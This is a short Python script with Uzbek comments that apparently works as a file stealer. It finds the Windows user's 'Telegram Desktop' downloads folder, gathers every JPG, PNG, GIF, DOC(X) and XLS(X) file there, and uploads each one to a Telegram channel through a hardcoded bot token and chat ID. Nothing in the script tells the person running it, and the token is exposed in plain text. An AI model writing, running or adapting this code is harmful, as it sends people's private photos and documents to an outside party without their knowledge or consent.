import os
import glob
import requests
import time

# Telegram Bot Token va Chat ID
BOT_TOKEN = "8160649324:AAHMeheejCC-T_92MSwe3TCsHb4AnvLX9GM"  # BotFather'dan olingan token
CHAT_ID = "-1002891104748"      # Kanalning chat ID si

# Kampyuter nomini olish
username = os.getlogin()
TELEGRAM_FOLDER = os.path.join("C:\\Users", username, "Downloads", "Telegram Desktop")

# Telegram'ga fayl yuborish funksiyasi
def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": CHAT_ID}
        response = requests.post(url, data=data, files=files)
    return response.json()

# Asosiy funksiya
def main():
    if not os.path.exists(TELEGRAM_FOLDER):
        print(f"{TELEGRAM_FOLDER} papkasi mavjud emas.")
        return

    # Fayl turlari ro'yxati
    file_extensions = ["*.jpg", "*.png", "*.gif", "*.doc", "*.docx", "*.xls", "*.xlsx"]
    files_to_send = []
    
    # Papkadagi fayllarni topish
    for ext in file_extensions:
        files_to_send.extend(glob.glob(os.path.join(TELEGRAM_FOLDER, ext)))
    
    if not files_to_send:
        print("Yuborish uchun fayllar topilmadi.")
        return

    # Fayllarni Telegram'ga yuborish
    for file_path in files_to_send:
        print(f"Yuborilmoqda: {file_path}")
        result = send_file_to_telegram(file_path)
        if result.get("ok"):
            print(f"{file_path} muvaffaqiyatli yuborildi.")
        else:
            print(f"{file_path} yuborishda xato: {result.get('description')}")
        time.sleep(1)  # Telegram API cheklovlaridan qochish uchun pauza

if __name__ == "__main__":
    main()
    input("Davom etish uchun istalgan tugmani bosing...")